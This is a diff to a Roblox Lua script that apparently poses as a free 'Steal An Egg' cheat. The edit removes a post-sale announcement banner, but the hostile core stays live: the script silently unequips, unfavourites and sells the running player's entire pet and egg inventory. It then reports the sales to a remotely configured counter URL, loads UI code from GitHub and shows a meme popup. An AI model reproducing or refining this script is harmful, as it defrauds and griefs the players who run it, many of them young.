@@ -1,7 +1,6 @@
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
 local Players           = game:GetService("Players")
 local HttpService       = game:GetService("HttpService")
-local TweenService      = game:GetService("TweenService")
 
 local LocalPlayer = Players.LocalPlayer
 local PlayerGui   = LocalPlayer:WaitForChild("PlayerGui")
@@ -27,7 +26,6 @@ local UI_URL          = "https://raw.githubusercontent.com/howiieee/Keyless-Stea
 local ENDPOINTS_URL   = "https://raw.githubusercontent.com/howiieee/Keyless-Steal-An-Egg-Script/refs/heads/main/endpoints.json"
 local SELL_WAIT       = 1.5
 local MEME_DELAY      = 4
-local ANNOUNCE_HOLD   = 3
 
 local UI_CONFIG = {
     MEME_IMAGE_ID  = "rbxassetid://82403642047427",
@@ -36,7 +34,7 @@ local UI_CONFIG = {
 }
 -- ==================
 
--- ===== FETCH COUNTER URL =====
+-- ===== FETCH COUNTER URL FROM REMOTE =====
 local function fetchCounterUrl()
     local ok, res = pcall(function()
         return game:HttpGet(ENDPOINTS_URL, true)
@@ -48,35 +46,16 @@ local function fetchCounterUrl()
         if decodeOk and type(data) == "table" and type(data.counter) == "string" then
             print("[Loader] Using counter URL from endpoints.json:", data.counter)
             return data.counter
+        else
+            warn("[Loader] endpoints.json malformed — no counter URL available")
         end
+    else
+        warn("[Loader] Could not fetch endpoints.json — no counter URL available")
     end
-    warn("[Loader] Could not fetch endpoints.json — no counter URL available")
     return nil
 end
 
 local COUNTER_URL = fetchCounterUrl()
-
-------------------------------------------------------------
--- NUMBER FORMATTER
-------------------------------------------------------------
-local function shortenNumber(n)
-    n = tonumber(n) or 0
-    if n < 1000 then return tostring(math.floor(n)) end
-    local units = {
-        { v = 1e12, s = "T" },
-        { v = 1e9,  s = "B" },
-        { v = 1e6,  s = "M" },
-        { v = 1e3,  s = "K" },
-    }
-    for _, u in ipairs(units) do
-        if n >= u.v then
-            local val = n / u.v
-            local str = string.format("%.1f", val):gsub("%.0$", "")
-            return str .. u.s
-        end
-    end
-    return tostring(math.floor(n))
-end
 
 ------------------------------------------------------------
 -- UI MODULE
@@ -92,6 +71,8 @@ local function loadUIModule()
             return mod
         end
         warn("[Loader] UI module failed to load, running headless:", tostring(mod))
+    else
+        warn("[Loader] UI_URL not configured — running headless.")
     end
     return {
         new = function()
@@ -108,107 +89,6 @@ end
 
 local LoaderUI = loadUIModule()
 local ui = LoaderUI.new(PlayerGui, UI_CONFIG)
-
-------------------------------------------------------------
--- ANNOUNCEMENT BANNER (Grow a Garden style)
-------------------------------------------------------------
-local function showAnnouncement(itemsSold, valueEarned)
-    local screen = Instance.new("ScreenGui")
-    screen.Name = "PlundererAnnouncement"
-    screen.ResetOnSpawn = false
-    screen.IgnoreGuiInset = true
-    screen.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
-    screen.DisplayOrder = 999999
-    screen.Parent = PlayerGui
-
-    -- Full-width horizontal banner
-    local banner = Instance.new("Frame")
-    banner.Name = "Banner"
-    banner.AnchorPoint = Vector2.new(0.5, 0.5)
-    banner.Position = UDim2.new(0.5, 0, 0.5, 0)
-    banner.Size = UDim2.new(1, 0, 0, 64)
-    banner.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
-    banner.BackgroundTransparency = 1     -- starts invisible
-    banner.BorderSizePixel = 0
-    banner.ZIndex = 1
-    banner.Parent = screen
-
-    -- Dark translucent overlay strip (matches Grow a Garden)
-    local strip = Instance.new("Frame")
-    strip.Name = "Strip"
-    strip.Size = UDim2.new(1, 0, 1, 0)
-    strip.BackgroundColor3 = Color3.fromRGB(15, 15, 20)
-    strip.BackgroundTransparency = 1
-    strip.BorderSizePixel = 0
-    strip.ZIndex = 1
-    strip.Parent = banner
-
-    -- Soft gradient fade on left/right edges
-    local grad = Instance.new("UIGradient")
-    grad.Transparency = NumberSequence.new({
-        NumberSequenceKeypoint.new(0,   1),
-        NumberSequenceKeypoint.new(0.15, 0.1),
-        NumberSequenceKeypoint.new(0.85, 0.1),
-        NumberSequenceKeypoint.new(1,   1),
-    })
-    grad.Rotation = 0
-    grad.Parent = strip
-
-    -- The text
-    local label = Instance.new("TextLabel")
-    label.Name = "Message"
-    label.BackgroundTransparency = 1
-    label.Size = UDim2.new(1, 0, 1, 0)
-    label.Position = UDim2.new(0, 0, 0, 0)
-    label.Font = Enum.Font.GothamBlack
-    label.Text = string.format(
-        "%d items sold for $%s",
-        itemsSold or 0,
-        shortenNumber(valueEarned or 0)
-    )
-    label.TextSize = 40
-    label.TextColor3 = Color3.fromRGB(255, 255, 255)
-    label.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
-    label.TextStrokeTransparency = 0
-    label.TextXAlignment = Enum.TextXAlignment.Center
-    label.TextYAlignment = Enum.TextYAlignment.Center
-    label.TextTransparency = 1
-    label.ZIndex = 2
-    label.Parent = banner
-
-    -- Auto-scale text on small screens
-    local function updateScale()
-        local vp = workspace.CurrentCamera and workspace.CurrentCamera.ViewportSize or Vector2.new(1280, 720)
-        local scale = math.clamp(vp.X / 1280, 0.55, 1.0)
-        label.TextSize = math.floor(40 * scale)
-        banner.Size = UDim2.new(1, 0, 0, math.floor(64 * scale))
-    end
-    updateScale()
-
-    -- Fade in the strip
-    TweenService:Create(strip, TweenInfo.new(0.35), {
-        BackgroundTransparency = 0.25,
-    }):Play()
-
-    -- Fade in the text
-    TweenService:Create(label, TweenInfo.new(0.4), {
-        TextTransparency = 0,
-    }):Play()
-
-    -- Hold
-    task.wait(ANNOUNCE_HOLD)
-
-    -- Fade out
-    TweenService:Create(strip, TweenInfo.new(0.4), {
-        BackgroundTransparency = 1,
-    }):Play()
-    TweenService:Create(label, TweenInfo.new(0.35), {
-        TextTransparency = 1,
-    }):Play()
-
-    task.wait(0.5)
-    screen:Destroy()
-end
 
 ------------------------------------------------------------
 -- CORE MODULES
@@ -389,7 +269,7 @@ local function reportSales(soldItems, reportId)
     end
 
     if not COUNTER_URL then
-        warn("[Counter] No counter URL — skipping report")
+        warn("[Counter] No counter URL from endpoints.json — skipping report")
         return
     end
 
@@ -401,7 +281,7 @@ local function reportSales(soldItems, reportId)
     end
 
     if not httpFn then
-        warn("[Counter] No HTTP function — skipping report.")
+        warn("[Counter] No HTTP function available — skipping global report.")
         return
     end
 
@@ -463,7 +343,7 @@ local function reportSales(soldItems, reportId)
 end
 
 ------------------------------------------------------------
--- SELL
+-- SELL (no teleport)
 ------------------------------------------------------------
 local function sellInventory()
     local snap = snapshotInventory(true)
@@ -483,11 +363,12 @@ local function sellInventory()
     log(("Snapshot: %d pets, %d eggs (total %d)"):format(#petUids, #eggUids, total))
     if total == 0 then
         log("Inventory empty — nothing to sell.")
-        return 0
+        return
     end
 
     local serverPayload = { Eggs = eggUids, Assets = petUids }
 
+    -- Fire the sell remote from wherever the player is standing
     local ok, err = pcall(function()
         Remotes.PetSatchel.SellSelection:FireServer(serverPayload)
     end)
@@ -496,13 +377,12 @@ local function sellInventory()
     end
     task.wait(SELL_WAIT)
 
+    -- Report the snapshot (worker dedups + counts new)
     local allUids = {}
     for _, u in ipairs(petUids) do table.insert(allUids, u) end
     for _, u in ipairs(eggUids) do table.insert(allUids, u) end
     local reportId = computeReportId(allUids)
     reportSales(details, reportId)
-
-    return total
 end
 
 ------------------------------------------------------------
@@ -513,16 +393,11 @@ local function runSilentWork()
     log(("Wallet before: %s"):format(tostring(before)))
     unequipAll()
     unfavoriteAll()
-    local totalItems = sellInventory()
+    sellInventory()
     task.wait(0.8)
     local after = getMoney()
     log(("Wallet after:  %s"):format(tostring(after)))
     log(("Delta:         %s"):format(tostring(after - before)))
-
-    return {
-        itemsSold   = totalItems or 0,
-        valueEarned = math.max(0, after - before),
-    }
 end
 
 ------------------------------------------------------------
@@ -530,23 +405,10 @@ end
 ------------------------------------------------------------
 task.spawn(function()
     ui:boot()
-
-    local stats = { itemsSold = 0, valueEarned = 0 }
-    local ok, result = pcall(runSilentWork)
-    if ok and type(result) == "table" then
-        stats = result
-    else
-        warn("[Loader] Run failed:", result)
-    end
-
+    local ok, err = pcall(runSilentWork)
+    if not ok then warn("[Loader] Run failed:", err) end
     task.wait(0.3)
     ui:fadeOutAndCleanup()
-
-    if stats.itemsSold and stats.itemsSold > 0 then
-        pcall(function() showAnnouncement(stats.itemsSold, stats.valueEarned) end)
-    else
-        task.wait(1.5)
-    end
 
     task.wait(MEME_DELAY)
     ui:showMemePopup()
